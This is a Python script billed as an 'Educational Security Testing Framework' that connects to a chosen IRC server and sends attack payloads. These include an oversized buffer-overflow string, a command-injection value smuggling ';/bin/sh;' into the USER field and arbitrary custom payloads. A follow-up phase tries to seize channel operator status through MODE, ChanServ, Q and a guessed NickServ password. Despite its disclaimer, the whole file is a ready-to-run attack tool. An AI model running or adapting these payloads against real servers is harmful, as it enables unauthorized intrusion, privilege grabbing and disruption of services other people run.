#!/usr/bin/env python3
import socket
import sys
import time
import threading
from queue import Queue

class ExploitFramework:
    def __init__(self):
        self.server_ip = ""
        self.server_port = 0
        self.nickname = ""
        self.vulnerability_type = ""
        self.payload = ""
        self.verbose = True
        self.timeout = 5
        self.connection = None
        self.receive_queue = Queue()
        self.running = False

    def print_banner(self):
        banner = """
        ███████╗██╗  ██╗██████╗ ██████╗ ██╗████████╗
        ██╔════╝╚██╗██╔╝██╔══██╗██╔══██╗██║╚══██╔══╝
        █████╗   ╚███╔╝ ██████╔╝██████╔╝██║   ██║   
        ██╔══╝   ██╔██╗ ██╔═══╝ ██╔══██╗██║   ██║   
        ███████╗██╔╝ ██╗██║     ██║  ██║██║   ██║   
        ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝   ╚═╝   
        Educational Security Testing Framework v1.0
        """
        print(banner)

    def get_user_input(self):
        print("\n[+] Enter target server details")
        self.server_ip = input("[?] Server IP: ").strip()
        
        while True:
            try:
                port_input = input("[?] Server Port (default 6667): ").strip()
                self.server_port = int(port_input) if port_input else 6667
                if 1 <= self.server_port <= 65535:
                    break
                print("[-] Port must be between 1 and 65535")
            except ValueError:
                print("[-] Please enter a valid number")
        
        self.nickname = input("[?] Desired Nickname: ").strip()
        if not self.nickname:
            self.nickname = "SecTest" + str(int(time.time()))[-4:]
        
        print("\n[+] Select vulnerability type:")
        print("1. Buffer Overflow")
        print("2. Command Injection")
        print("3. IRC Protocol Exploit")
        print("4. Custom Payload")
        
        while True:
            choice = input("[?] Choose (1-4): ").strip()
            if choice in ['1', '2', '3', '4']:
                self.vulnerability_type = choice
                break
            print("[-] Invalid choice")

    def generate_payload(self):
        if self.vulnerability_type == '1':
            # Buffer overflow payload
            self.payload = f"USER {self.nickname} {'A' * 500} :{'A' * 500}\r\n"
            self.payload += f"NICK {self.nickname}\r\n"
        elif self.vulnerability_type == '2':
            # Command injection attempt
            self.payload = f"USER ;/bin/sh; {self.nickname} {self.nickname} :{self.nickname}\r\n"
            self.payload += f"NICK {self.nickname}\r\n"
        elif self.vulnerability_type == '3':
            # IRC protocol exploit attempt
            self.payload = f"NICK {self.nickname}\r\n"
            self.payload += f"USER {self.nickname} 0 * :Real Name\r\n"
            self.payload += "PRIVMSG NickServ :GHOST {}\r\n".format(self.nickname)
            self.payload += "PRIVMSG NickServ :IDENTIFY {}\r\n".format(self.nickname)
            self.payload += "MODE {}\r\n".format(self.nickname)
        else:
            # Custom payload
            custom = input("[?] Enter your custom payload (use \\r\\n for new lines): ")
            self.payload = custom.replace('\\r\\n', '\r\n')

        if self.verbose:
            print("\n[+] Generated Payload:")
            print("----------------------")
            print(repr(self.payload))
            print("----------------------")

    def connect_to_server(self):
        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.settimeout(self.timeout)
            self.connection.connect((self.server_ip, self.server_port))
            
            if self.verbose:
                print(f"\n[+] Connected to {self.server_ip}:{self.server_port}")
                banner = self.connection.recv(1024).decode('utf-8', errors='ignore')
                if banner:
                    print("[+] Server Banner:")
                    print(banner)
            
            return True
        except Exception as e:
            print(f"[-] Connection failed: {str(e)}")
            return False

    def send_payload(self):
        try:
            if not self.connection:
                if not self.connect_to_server():
                    return False
            
            if self.verbose:
                print("\n[+] Sending payload...")
            
            self.connection.sendall(self.payload.encode('utf-8'))
            
            if self.verbose:
                print("[+] Payload sent, waiting for response...")
                time.sleep(1)
                response = self.connection.recv(4096).decode('utf-8', errors='ignore')
                if response:
                    print("[+] Server Response:")
                    print(response)
            
            return True
        except Exception as e:
            print(f"[-] Error sending payload: {str(e)}")
            return False

    def start_receiver(self):
        def receiver():
            while self.running:
                try:
                    data = self.connection.recv(4096).decode('utf-8', errors='ignore')
                    if data:
                        self.receive_queue.put(data)
                        if self.verbose:
                            print(f"[Server] {data.strip()}")
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[-] Receiver error: {str(e)}")
                    break
        
        if self.connection:
            self.running = True
            threading.Thread(target=receiver, daemon=True).start()

    def attempt_privilege_escalation(self):
        if not self.connect_to_server():
            return False
        
        self.start_receiver()
        
        try:
            # Send initial handshake
            self.connection.sendall(f"NICK {self.nickname}\r\n".encode())
            self.connection.sendall(f"USER {self.nickname} 0 * :Security Tester\r\n".encode())
            
            # Wait for welcome messages
            time.sleep(1)
            
            # Attempt to join a channel and get op
            self.connection.sendall("JOIN #test\r\n".encode())
            time.sleep(0.5)
            
            # Try common IRC operator commands
            commands = [
                f"MODE #test +o {self.nickname}\r\n",
                f"PRIVMSG ChanServ :OP #test {self.nickname}\r\n",
                f"PRIVMSG NickServ :IDENTIFY password\r\n",
                f"PRIVMSG Q :GETOP {self.nickname}\r\n"
            ]
            
            for cmd in commands:
                if self.verbose:
                    print(f"[+] Trying: {cmd.strip()}")
                self.connection.sendall(cmd.encode())
                time.sleep(1)
            
            # Check if we got any operator status
            response = ""
            while not self.receive_queue.empty():
                response += self.receive_queue.get()
            
            if " MODE #test +o " in response or "You are now an operator" in response:
                print("\n[+] Potential success! Operator privileges may have been obtained.")
                print("[+] Server response indicates operator status change.")
            else:
                print("\n[-] Operator privilege escalation attempt unsuccessful.")
                print("[+] Server responses did not indicate operator status change.")
            
            return True
        except Exception as e:
            print(f"[-] Privilege escalation failed: {str(e)}")
            return False
        finally:
            self.running = False
            if self.connection:
                self.connection.close()

    def run(self):
        self.print_banner()
        self.get_user_input()
        self.generate_payload()
        
        print("\n[+] Starting exploit sequence...")
        
        if self.send_payload():
            print("\n[+] Initial payload delivery complete")
            
            if input("[?] Attempt operator privilege escalation? (y/n): ").lower() == 'y':
                print("\n[+] Starting privilege escalation phase...")
                self.attempt_privilege_escalation()
        
        print("\n[+] Exploit sequence completed")
        print("[+] Remember: This was for educational purposes only!")

if __name__ == "__main__":
    try:
        exploit = ExploitFramework()
        exploit.run()
    except KeyboardInterrupt:
        print("\n[-] Operation cancelled by user")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Fatal error: {str(e)}")
        sys.exit(1)
